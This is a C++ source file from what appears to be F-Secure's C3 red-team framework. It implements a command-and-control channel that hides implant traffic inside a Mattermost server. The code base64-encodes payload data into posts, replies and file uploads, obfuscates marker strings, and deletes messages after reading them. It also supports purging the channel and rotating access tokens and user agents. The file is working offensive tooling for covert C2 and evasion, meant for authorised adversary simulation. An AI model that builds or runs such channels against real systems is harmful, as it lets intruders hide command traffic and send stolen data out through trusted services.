#include "Stdafx.h"
#include "Mattermost.h"
#include "Common/FSecure/Crypto/Base64.h"
#include "Common/FSecure/WinHttp/Uri.h"

using namespace FSecure::WinHttp;

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::C3::Interfaces::Channels::Mattermost::Mattermost(ByteView arguments)
	: m_inboundDirectionName{ arguments.Read<std::string>() }
	, m_outboundDirectionName{ arguments.Read<std::string>() }
{
	auto [MattermostServerUrl, MattermostUserName, MattermostTeamName, MattermostAccessToken, channelName, userAgent] = arguments.Read<std::string, std::string, std::string, std::string, std::string, std::string>();

	if (!MattermostServerUrl.empty() && MattermostServerUrl.back() == '/')
		MattermostServerUrl.pop_back();

	m_MattermostObj = FSecure::Mattermost{ MattermostServerUrl, MattermostUserName, MattermostTeamName, MattermostAccessToken, channelName, userAgent };
}


//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
size_t FSecure::C3::Interfaces::Channels::Mattermost::OnSendToChannel(ByteView data)
{
	try
	{
		//Begin by creating a message where we can write the data to in a thread, both client and server ignore this message to prevent race conditions
		std::string postID = m_MattermostObj.WritePost(m_outboundDirectionName + OBF(":writing"));

		// Error. Try to retransmit that packet.
		if (postID.empty())
			return 0;

		//this is more than 30 messages, send it as a file (we do this infrequently as file uploads restricted to 20 per minute).
		//Using file upload for staging (~88 messages) is a huge improvement over sending actual replies.

		size_t actualPacketSize = 0;
		if (data.size() > 30 * 16'370)
		{
			// Mattermost accepts files no bigger than 50MBs in its default configuration. 
			constexpr auto maxPacketSize = cppcodec::base64_rfc4648::decoded_max_size(48 * 1024 * 1024);
			
			actualPacketSize = std::min(maxPacketSize, data.size());
			auto sendData = data.SubString(0, actualPacketSize);
			auto fileID = m_MattermostObj.UploadFile(cppcodec::base64_rfc4648::encode<ByteVector>(sendData.data(), sendData.size()));

			// Error. Try to retransmit that packet.
			if (fileID.empty())
				return 0;

			auto foo = m_MattermostObj.WriteReply("", postID, fileID);
			
			// Error. Try to retransmit that packet.
			if (foo.empty())
				return 0;
		}
		else
		{
			//Write the full data into the thread. This makes it a lot easier to read in onRecieve as Mattermost limits messages to 16383 characters.
			constexpr auto maxPacketSize = cppcodec::base64_rfc4648::decoded_max_size(16'370);
			actualPacketSize = std::min(maxPacketSize, data.size());
			auto sendData = data.SubString(0, actualPacketSize);
			auto foo = m_MattermostObj.WriteReply(cppcodec::base64_rfc4648::encode(sendData.data(), sendData.size()), postID);

			// Error. Try to retransmit that packet.
			if (foo.empty())
				return 0;
		}

		//Update the original first message with "C2S||S2C:Done" - these messages will always be read in onRecieve.
		std::string message = m_outboundDirectionName + OBF(":Done");

		m_MattermostObj.UpdatePost(message, postID);
		return actualPacketSize;
	}
	catch (...)
	{
		// Should exception be thrown, return 0 to make C3 retransmit that packet.
		return 0;
	}
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
std::vector<FSecure::ByteVector> FSecure::C3::Interfaces::Channels::Mattermost::OnReceiveFromChannel()
{
	auto messages = m_MattermostObj.GetMessagesByDirection(m_inboundDirectionName + OBF(":Done"));

	std::vector<ByteVector> ret;

	//Read the messages in reverse order (which is actually from the oldest to newest)
	//Avoids old messages being left behind.
	//for (std::vector<std::string>::reverse_iterator postID = messages.rbegin(); postID != messages.rend(); ++postID)
	for (std::vector<std::string>::iterator postID = messages.begin(); postID != messages.end(); ++postID)
	{
		auto replies = m_MattermostObj.ReadReplies(*postID);
		std::vector<std::string> replyIDs;
		std::string message;

		//Get all of the messages from the replies.
		for (auto&& reply : replies)
		{
			message.append(reply.second);
			replyIDs.push_back(std::move(reply.first)); //get all of the post_ids for later deletion
		}
		
		ret.emplace_back(std::move(cppcodec::base64_rfc4648::decode(message)));

		DeleteReplies(replyIDs);
		m_MattermostObj.DeletePost(*postID);
	}

	return ret;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void FSecure::C3::Interfaces::Channels::Mattermost::DeleteReplies(std::vector<std::string> const & postIDs)
{
	for (auto&& postID : postIDs)
	{
		m_MattermostObj.DeletePost(postID);
	}
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::ByteVector FSecure::C3::Interfaces::Channels::Mattermost::OnRunCommand(ByteView command)
{
	auto commandCopy = command;
	switch (command.Read<uint16_t>())
	{
	case 0:
		m_MattermostObj.PurgeChannel();
		return {};
	case 1:
		m_MattermostObj.SetToken(command.Read<std::string>());
		return {};
	case 2:
		m_MattermostObj.SetUserAgent(command.Read<std::string>());
		return {};
	default:
		return AbstractChannel::OnRunCommand(commandCopy);
	}
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
const char* FSecure::C3::Interfaces::Channels::Mattermost::GetCapability()
{
	return R"_(
{
	"create":
	{
		"arguments":
		[
			[
				{
					"type": "string",
					"name": "Input ID",
					"min": 4,
					"randomize": true,
					"description": "Used to distinguish packets for the channel"
				},
				{
					"type": "string",
					"name": "Output ID",
					"min": 4,
					"randomize": true,
					"description": "Used to distinguish packets from the channel"
				}
			],
			{
				"type": "string",
				"name": "Mattermost Server URL",
				"min": 1,
				"description": "Mattermost Server URL starting with schema, without a trailing slash. E.g. https://my-mattermost.com"
			},
			{
				"type": "string",
				"name": "Mattermost Username / ID",
				"min": 1,
				"description": "Some channels are only visible to the specific user. Submit the username to search for more channels."
			},
			{
				"type": "string",
				"name": "Mattermost Team Name / ID",
				"min": 1,
				"description": "Mattermost Team Name to create a channel within. Mattermost's Teams are analogy to Slack's Workspaces."
			},
			{
				"type": "string",
				"name": "Mattermost Access Token",
				"min": 1,
				"description": "Mattermost user's Personal Access Token. Example token: chhtxfgmzhfct5qi5si7tiexuc"
			},
			{
				"type": "string",
				"name": "Channel name",
				"min": 6,
				"randomize": true,
				"description": "Name of Mattermost's channel used by api"
			},
			{
				"type": "string",
				"name": "User-Agent Header",
				"description": "The User-Agent header to set. Warning: adding user agent header of web browser, can cause site security provider to block access to api, and prevent channel from functioning."
			}
		]
	},
	"commands": [
		{
			"name": "Clear all channel messages",
			"id": 0,
			"description": "Clearing old messages from a channel may increase bandwidth",
			"arguments": []
		},
		{
			"name": "Change Mattermost Access Token",
			"id": 1,
			"description": "Change Mattermost Access Token used to authenticate to Mattermost.",
			"arguments":
			[
				{
					"type" : "string",
					"name": "New Mattermost Access Token",
					"min": 1,
					"description" : "New Mattermost Access Token value."
				}
			]
		},
		{
			"name": "Change User-Agent Header",
			"id": 2,
			"description": "Change User-Agent Header.",
			"arguments":
			[
				{
					"type": "string",
					"name": "User-Agent Header",
					"description": "The User-Agent header to set. Warning: adding user agent header of web browser, can cause site security provider to block access to api, and prevent channel from functioning."
				}
			]
		}
	]
}
)_";
}
